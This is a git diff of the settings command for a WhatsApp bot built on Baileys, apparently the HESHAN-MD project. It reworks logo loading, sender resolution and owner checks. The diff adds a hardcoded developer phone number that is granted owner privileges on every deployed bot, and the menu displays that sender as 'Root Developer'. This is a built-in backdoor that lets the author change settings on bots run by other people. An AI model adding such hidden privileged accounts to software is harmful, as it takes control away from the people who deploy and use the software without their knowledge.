@@ -1,35 +1,49 @@
+// commands/settings.js
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
 const mongoose = require('mongoose');
+const { jidNormalizedUser } = require('@whiskeysockets/baileys');
+
+// 👑 ROOT DEVELOPER NUMBER
+const DEVELOPER_NUMBER = '94719845166';
+const DEFAULT_LOGO_BACKUP = 'https://files.catbox.moe/a58add.jpeg';
 
 const memSettingsCache = new Map();
 
-// ⚡ Safe Logo Fetcher with Fallback
-let cachedLogo = null;
-async function getBotLogo() {
-  if (cachedLogo) return cachedLogo;
-
+// ⚡ Dynamic Session Logo Resolver
+async function getBotLogoBuffer(botNum) {
   try {
-    const paths = [
-      path.join(process.cwd(), 'logo.jpg'),
-      path.join(__dirname, '../logo.jpg'),
-      path.join(process.cwd(), 'assets', 'logo.jpg')
-    ];
-    for (const p of paths) {
-      if (fs.existsSync(p)) {
-        cachedLogo = fs.readFileSync(p);
-        return cachedLogo;
+    let logoSource = null;
+
+    if (typeof global.getBotSettings === 'function' && botNum) {
+      const st = await global.getBotSettings(botNum);
+      if (st?.botLogo) logoSource = st.botLogo;
+    }
+
+    if (!logoSource) logoSource = DEFAULT_LOGO_BACKUP;
+
+    if (typeof logoSource === 'string') {
+      if (logoSource.startsWith('data:image')) {
+        const base64Data = logoSource.split(',')[1];
+        return Buffer.from(base64Data, 'base64');
+      }
+
+      if (logoSource.startsWith('http')) {
+        const res = await axios.get(logoSource, { responseType: 'arraybuffer', timeout: 8000 });
+        return Buffer.from(res.data);
+      }
+
+      if (fs.existsSync(logoSource)) {
+        return fs.readFileSync(logoSource);
       }
     }
   } catch (e) {}
 
   try {
-    const fallbackUrl = 'https://raw.githubusercontent.com/diniduheshan40-design/HESH-MD/main/logo.jpg';
-    const res = await axios.get(fallbackUrl, { responseType: 'arraybuffer', timeout: 5000 });
-    cachedLogo = Buffer.from(res.data, 'binary');
-    return cachedLogo;
-  } catch (e) {
+    const res = await axios.get(DEFAULT_LOGO_BACKUP, { responseType: 'arraybuffer', timeout: 6000 });
+    return Buffer.from(res.data);
+  } catch (err) {
     return null;
   }
 }
@@ -50,44 +64,49 @@ module.exports = {
   desc: 'Manage individual bot settings',
 
   async execute(sock, msg, args = [], chatJid, safeReply, options = {}) {
-    const targetChat = (typeof chatJid === 'string' && chatJid.includes('@')) 
-      ? chatJid 
-      : (msg.key && msg.key.remoteJid ? msg.key.remoteJid : null);
-
+    const targetChat = chatJid || msg.key?.remoteJid;
     if (!targetChat) return;
 
-    const channelContext = global.channelContext?.contextInfo || {
-      forwardingScore: 999,
-      isForwarded: true,
-      forwardedNewsletterMessageInfo: {
-        newsletterJid: '120363421906774107@newsletter',
-        newsletterName: '✗ ʜᴇꜱʜᴀɴ ᴏꜰᴄ ✨',
-        serverMessageId: 1
-      }
-    };
+    const channelContext = global.channelContext || {};
 
     const rawBotId = sock.user?.id || sock.user?.jid || '';
-    const botNumber = rawBotId.split(':')[0].split('@')[0].replace(/\D/g, '') || 'default';
-    const senderNumber = (msg.key.participant || targetChat || '').split(':')[0].split('@')[0].replace(/\D/g, '');
+    const botNumber = jidNormalizedUser(rawBotId).replace(/\D/g, '') || 'default';
 
+    // ⚡ 1. SENDER RESOLUTION (Group / Private / LID Support)
+    const isGroup = targetChat.endsWith('@g.us');
+    let senderJid = isGroup 
+      ? (msg.key?.participant || msg.participant || '') 
+      : (msg.key?.fromMe ? (sock.user?.id || '') : targetChat);
+
+    if (senderJid.endsWith('@lid') && sock.signalRepository?.lidToJid) {
+      try {
+        const resolved = await sock.signalRepository.lidToJid(senderJid);
+        if (resolved) senderJid = resolved;
+      } catch (e) {}
+    }
+
+    const cleanSenderNum = jidNormalizedUser(senderJid).replace(/\D/g, '');
+
+    // 👑 2. MASTER DEVELOPER & OWNER VERIFICATION
+    const isDeveloper = cleanSenderNum === DEVELOPER_NUMBER;
     const isOwner = Boolean(
+      isDeveloper ||
       options.isOwner || 
-      msg.key.fromMe || 
-      (Array.isArray(global.owner) && global.owner.some(o => o.includes(senderNumber))) ||
-      senderNumber === botNumber
+      msg.key?.fromMe || 
+      (Array.isArray(global.owner) && global.owner.some(o => String(o).replace(/\D/g, '') === cleanSenderNum)) ||
+      cleanSenderNum === botNumber
     );
 
     const reply = async (content) => {
       try {
-        if (typeof safeReply === 'function') return await safeReply(content);
+        if (typeof safeReply === 'function' && typeof content === 'string') return await safeReply(content);
         const payload = typeof content === 'string' ? { text: content } : { ...content };
-        payload.contextInfo = { ...(payload.contextInfo || {}), ...channelContext };
-        return await sock.sendMessage(targetChat, payload, { quoted: msg });
+        return await sock.sendMessage(targetChat, { ...payload, ...channelContext }, { quoted: msg });
       } catch (err) {}
     };
 
     if (!isOwner) {
-      return await reply('⛔ *Access Denied!* Only Bot Owner can modify settings.');
+      return await reply('⛔ *Access Denied!* Settings වෙනස් කළ හැක්කේ Bot හිමිකරුට (Owner) පමණි.');
     }
 
     const defaultValues = {
@@ -115,7 +134,7 @@ module.exports = {
       }
     } catch (e) {}
 
-    // Input Resolution
+    // Input Extraction
     const rawText = (msg.message?.conversation || msg.message?.extendedTextMessage?.text || '').trim();
     let input = "";
 
@@ -125,7 +144,6 @@ module.exports = {
       input = rawText.toLowerCase().trim();
     }
 
-    // Strip prefix if invoked directly like .set or .settings
     input = input.replace(/^[./!#]?(settings|setting|set|config)\s*/i, '').trim();
 
     let isUpdated = false;
@@ -283,10 +301,11 @@ module.exports = {
     const currentReactDisplay = settings.statusReactEmoji === 'random' ? 'RANDOM 🔀' : (settings.statusReactEmoji || '💚');
     const antiSendDestDisplay = settings.antiDeleteDest === 'from' ? 'FROM (Chat Itself) 💬' : 'ME (My Inbox) 📥';
 
-    const menu = `╭─── ⚡ *HESHAN-MD SYSTEM SETTINGS* ⚡ ───╮
+    const menu = 
+`╭─── ⚡ *HESHAN-MD SYSTEM SETTINGS* ⚡ ───╮
 │
 ├ 🤖 *Target Session :* +${botNumber}
-├ 🛡️ *Master Access  :* Verified
+├ 🛡️ *Master Access  :* ${isDeveloper ? '👑 Root Developer' : 'Owner Verified'}
 │
 ├─◈ *1. WORK MODE* ⤿ [ ${modeBadge} ]
 │  ├ 1.1 Private
@@ -349,13 +368,13 @@ module.exports = {
 > ⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇꜱʜᴀɴ-ᴍᴅ ⚡`.trim();
 
     try {
-      const logo = await getBotLogo();
-      if (logo) {
+      const logoBuffer = await getBotLogoBuffer(botNumber);
+      if (logoBuffer) {
         await sock.sendMessage(targetChat, {
-          image: logo,
+          image: logoBuffer,
           caption: menu,
           mimetype: 'image/jpeg',
-          contextInfo: channelContext
+          ...channelContext
         }, { quoted: msg });
         return;
       }
@@ -363,7 +382,7 @@ module.exports = {
 
     await sock.sendMessage(targetChat, { 
       text: menu,
-      contextInfo: channelContext
+      ...channelContext
     }, { quoted: msg }).catch(() => {});
   }
 };
